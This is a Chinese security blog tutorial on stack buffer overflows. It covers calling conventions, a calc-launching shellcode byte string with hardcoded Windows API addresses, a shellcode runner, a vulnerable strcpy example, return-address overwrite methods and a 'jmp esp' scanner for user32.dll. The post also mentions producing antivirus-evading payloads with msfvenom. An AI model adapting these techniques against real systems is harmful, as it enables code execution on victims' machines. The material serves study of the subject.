---
layout:     post
title:      漏洞分析
subtitle:   
date:       2019-03-10
author:     volcanohatred
header-img: img/articles/漏洞分析/title.jpg
catalog: true
tags:
    - 漏洞
---

这几天从公司离职清闲了不少，所以抽空写一篇常见漏洞的基础知识，供自己以后参考学习。

## 缓冲区溢出
溢出的根本原因：冯洛伊曼计算机体系未对数据代码进行区分
### 栈溢出
#### 调用约定
想要弄明白栈溢出，首先得知道三种调用约定：cdecl，stdcall和fastcall。
cdecl是c/c++默认的调用方式，stdcall是windowsAPI默认的调用方式。在x86系统中，cdecl由调用函数负责栈平衡，而stdcall和fastcall都是被调用函数自己负责栈平衡。入栈方面都是从右往左依次入栈，但是fastcall前两个参数要放到ecx和edx中。  
![漏洞分析](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/漏洞分析/图片1.png)  
在vs2017中进行如下测试：  
```
int _cdecl func1(char a, short b, int c)
{
	return a + b + c;
}

int _stdcall func2(char a, short b, int c)
{
	return a + b + c;
}

int _fastcall func3(char a, short b, int c)
{
	return a + b + c;
}
int main()
{
	func1('v', 1, 2);
	func2('v', 1, 2);
	func3('v', 1, 2);
	return 0;
}
```  
debug版对应的汇编代码如下：  
```
int _cdecl func1(char a, short b, int c)
{
 push        ebp       //老ebp入栈
 mov         ebp,esp   //老esp和ebp同位置
 sub         esp,0C0h  //esp上移，局部变量空间
 push        ebx       //ebx,esi,edi无备份。
 push        esi  
 push        edi  
 lea         edi,[ebp-0C0h]  //以下4行代码让cc存满局部变量空间
 mov         ecx,30h  
 mov         eax,0CCCCCCCCh   //cc为断点指令
 rep stos    dword ptr es:[edi]  
	return a + b + c;
 movsx       eax,byte ptr [a]  
 movsx       ecx,word ptr [b]  
 add         eax,dword ptr [c]  
 add         eax,ecx    //返回值存放在eax中
}
 pop         edi        //ebx,esi,edi出栈
 pop         esi  
 pop         ebx  
 mov         esp,ebp  //ebp位置传给esp（esp下移）
 pop         ebp      //老ebp重新写入
 ret                  //直接返回，由调用者清理栈。ret会跳到eip所指位置
int _stdcall func2(char a, short b, int c)
{
 push        ebp  
 mov         ebp,esp  
 sub         esp,0C0h  
 push        ebx  
 push        esi  
 push        edi  
 lea         edi,[ebp-0C0h]  
 mov         ecx,30h  
 mov         eax,0CCCCCCCCh  
 rep stos    dword ptr es:[edi]  
	return a + b + c;
 movsx       eax,byte ptr [a]  
 movsx       ecx,word ptr [b]  
 add         eax,dword ptr [c]  
 add         eax,ecx  
}
 pop         edi  
 pop         esi  
 pop         ebx  
 mov         esp,ebp  
 pop         ebp  
 ret         0Ch   //被调用者栈平衡
int _fastcall func3(char a, short b, int c)
{
 push        ebp  
 mov         ebp,esp  
 sub         esp,0D8h  
 push        ebx  
 push        esi  
 push        edi  
 push        ecx  
 lea         edi,[ebp-0D8h]  
 mov         ecx,36h  
 mov         eax,0CCCCCCCCh  
 rep stos    dword ptr es:[edi]  
 pop         ecx  
 mov         word ptr [b],dx  
 mov         byte ptr [a],cl  
	return a + b + c;
 movsx       eax,byte ptr [a]  
	return a + b + c;
 movsx       ecx,word ptr [b]  
 add         eax,dword ptr [c]  
 add         eax,ecx  
}
 pop         edi  
 pop         esi  
 pop         ebx  
 mov         esp,ebp  
 pop         ebp  
 ret         4  
  

int main()
{
 push        ebp  
 mov         ebp,esp  
 sub         esp,0C0h  
 push        ebx  
 push        esi  
 push        edi        //debug版本特有调试代码
 lea         edi,[ebp-0C0h]  
 mov         ecx,30h  
 mov         eax,0CCCCCCCCh  
 rep stos    dword ptr es:[edi]  
	func1('v', 1, 2);
 push        2         //入栈顺序
 push        1           
 push        76h  
 call        _func1 (0BC1366h)   //调用函数
 add         esp,0Ch   //调用者栈平衡
	func2('v', 1, 2);
 push        2  
 push        1  
 push        76h  
 call        _func2@12 (0BC135Ch)  
	func3('v', 1, 2);
 push        2  
 mov         edx,1       //前两个放入寄存器
 mov         cl,76h  
 call        @func3@12 (0BC1361h)  
	return 0;
 xor         eax,eax  
}
 pop         edi  
 pop         esi  
 pop         ebx  
 add         esp,0C0h  
 cmp         ebp,esp  
 call        __RTC_CheckEsp (0BC111Dh)  
 mov         esp,ebp  
 pop         ebp  
 ret  
```  
以func1为例，通过调用约定，栈结构如下：  
![漏洞分析](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/漏洞分析/图片3.png)  
#### shellcode
简单了解了调用约定，来看看shellcode。
shellcode就是一段可执行的机器码的十六进制编码字符串，如汇编代码call eax可写成D0FF。  
以一个简单的弹计算器代码为例：  
```
"\x8B\xE5" //MOV ESP, EBP           
"\x55" //PUSH EBP
"\x8B\xEC" //mov ebp, esp
"\x33\xFF" //xor edi,edi
"\x57"//push edi
"\x83\xEC\x08" //sub esp,08h
"\xC6\x45\xF4\x6D"//mov byte ptr [ebp-0ch],'m'   将msvcrt.dll入栈
"\xC6\x45\xF5\x73"//'s'
"\xC6\x45\xF6\x76"//'v'
"\xC6\x45\xF7\x63"//'c'
"\xC6\x45\xF8\x72"//'r'
"\xC6\x45\xF9\x74"//'t'
"\xC6\x45\xFA\x2E"//'.'
"\xC6\x45\xFB\x64"//'d'
"\xC6\x45\xFC\x6C"//'l'
"\xC6\x45\xFD\x6C"//'l'
"\x8D\x45\xF4" //lea eax, [ebp-0ch]
"\x50" //push eax
"\xB8\x7B\x1D\x80\x7C" //mov eax, 7C801D7Bh     loadlibrary函数的地址放入eax中
"\xFF\xD0" //call eax                           通过loadlibrary加载msvcrt.dll
"\x33\xDB" //xor ebx, ebx
"\x53" //push ebx
"\x68\x2E\x65\x78\x65" //push 'exe.'            将calc.exe入栈
"\x68\x63\x61\x6C\x63" //push 'clac'
"\x8B\xC4" //mov eax, esp
"\x50" //push eax
"\xB8\xC7\x93\xBF\x77" //mov eax, 77BF93C7h     system函数的地址放入eax（在msvcrt.dll中）
"\xFF\xD0" //call eax                           system（"calc.exe");
"\xB8\xFA\xCA\x81\x7C" //mov eax, 7c81cafah     exitprocess函数的地址
"\xFF\xD0"//call eax
```  
上述函数的地址在不同系统下是不一样的，所以函数地址需要硬编码。需要注意，上面的shellcode可以拼接成一个整体，就是去掉双引号。另外shellcode不能含0，会被截断（需要修改汇编指令 mov eax, 0-->xor eax, eax）。
shellcode执行方法(用于线下测试)可以通过定义一个无返回值的函数指针类型，通过强转的形式执行。
```
typedef void(*Func)();
((Func)&shellcode)();
```  
#### shellcode设计
汇编大佬直接写就行，对于汇编水平一般的人，可以通过vs提取shellcode。  
思路-->C语言程序--》汇编程序--》嵌入汇编改写--》机器码  
先写一段c语言代码：  
```
 #include <windows.h>
 #include <winbase.h> 
 
 typedef void (*MYPROC)(LPTSTR);        //定义函数指针
 
 int main()
 {
 	HINSTANCE LibHandle;
 	MYPROC ProcAdd;
 	LibHandle = LoadLibrary("msvcrt.dll");
 	ProcAdd = (MYPROC) GetProcAddress(LibHandle, "system"); //查找system函数地址
 	(ProcAdd) ("calc.exe");   //其实就是执行system("clac.exe")
 	
 	return 0;
 }
```  
用vs2017编译需要将“使用unicode编码”改成“使用多字节字符集”，然后拿出汇编代码，重新编写：  
```
 #include <windows.h>
 void main()
 {
 	__asm
 	{
       汇编代码
 	}
 }
```  
在拿到机器码后以以下方式执行：  
```
unsigned char sh[]=机器码
typedef void(*Func)();

int main()
{
	( (Func) &sh)();
		
	return 0;
}
```  
当然这种方式也很麻烦，而且在可以先写好shellcode框架，通过搜索API地址的方法找到目标系统相关函数基地址，拿到基地址后直接修改shellcode模板就可以实现跨平台运行：  
```
#include <windows.h>
#include <stdio.h>

typedef void(*MYPROC)(LPTSTR);
int main()
{

	HINSTANCE LibHandle;
	MYPROC ProcAdd;
	MYPROC ProcExit;
	LibHandle = LoadLibrary("msvcrt.dll");
	printf("kernel32LibHandle = 0x%x\n", LibHandle);
	ProcAdd = (MYPROC)GetProcAddress(LibHandle, "system");
	printf("system= 0x%x\n", ProcAdd);
	ProcExit = (MYPROC)GetProcAddress(LibHandle, "exit");
	printf("exit= 0x%x\n", ProcExit);

	system("pause");
	return 0;
}
```  
除了通过vs生成之外，shellcode还可以通过msf生成，和在前面的《metesploit渗透测试工具（二）》生成免杀木马的过程差不多。用msfvenom导出机器码放到编译器里面进行编译。  
#### 溢出原理
![漏洞分析](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/漏洞分析/图片4.png)  
通过调用约定分析了栈的结构。现在假设一种情况，当我们向局部变量区域拷贝数据时，拷贝的数据大于局部变量的空间，因为内存增长方向和栈方向相反，所以数据会**向下**覆盖（内存增长方向覆盖），当覆盖了返回地址后，当前函数执行完成要执行的下一个地址已经变成被覆盖的数据。如果精心构造，使覆盖的数据在返回地址处为我们的shellcode的地址，那程序的下一步执行就会跳到我们的shellcode。这样我们就可以以当前程序权限执行任意代码。  
演示代码：  
```
void msg_display(char *buf)
{
  char msg[200];
  strcpy(msg,buf);
}
```  
strcpy是一个危险函数，未对拷贝的字符串长度进行验证，可导致缓冲区溢出。
#### 攻击
以上面代码为例：  
![漏洞分析](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/漏洞分析/图片5.png)  
如上图所示，在debug版（考虑老ebp入栈）情况下，可以有如下几种攻击方式：
1.204字节+msg局部变量区域地址（shellcode存放在这里）。  
2.204字节+堆地址（shellcode存放在堆上）。  
3.204字节+jmp esp地址（跳板）+返回地址下面的参数区域（buf处）
前两个比较好理解，第三个意思是寻找系统任意一个jmp esp指令（找user32.dll中的指令，user32.dll，kernel32.dll随系统一起启动,加载的基地址在同一系统始终相同）当执行完jmp esp指令后，ESP所指的位置是淹没的返回地址的下一位。  
![漏洞分析](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/漏洞分析/图片6.png)  
jmp esp地址获取  
```
//FF E0		JMP EAX
//FF E1		JMP ECX
//FF E2		JMP EDX
//FF E3		JMP EBX
//FF E4		JMP ESP
//FF E5		JMP EBP
//FF E6		JMP ESI
//FF E7		JMP EDI

//FF D0		CALL EAX
//FF D1		CALL ECX
//FF D2		CALL EDX
//FF D3		CALL EBX
//FF D4		CALL ESP
//FF D5		CALL EBP
//FF D6		CALL ESI
//FF D7		CALL EDI


//#define DLL_NAME "mfc42.dll"

#include <windows.h>
#include <stdio.h>
#define DLL_NAME "user32.dll"
int main()
{
	BYTE* ptr;
	int position,address;
	HINSTANCE handle;
	BOOL done_flag = FALSE;

	handle=LoadLibrary(DLL_NAME);

	if(!handle)
	{
		printf(" load dll erro !");
		exit(0);
	}

	ptr = (BYTE*)handle;
	
	for(position = 0; !done_flag; position++)
	{
		try
		{
			if(ptr[position] == 0xFF && ptr[position+1] == 0xE4)  //找到jmp esp
			{
				int address = (int)ptr + position;
				printf("OPCODE found at 0x%x\n",address);
			}
		}
		catch(...)
		{
			int address = (int)ptr + position;
			printf("END OF 0x%x\n", address);
			done_flag = true;
		}
	}
	return 0;
}
```  

### 1.2 堆溢出
### 1.3 SEH
### 1.4 HEAP-SPRAY

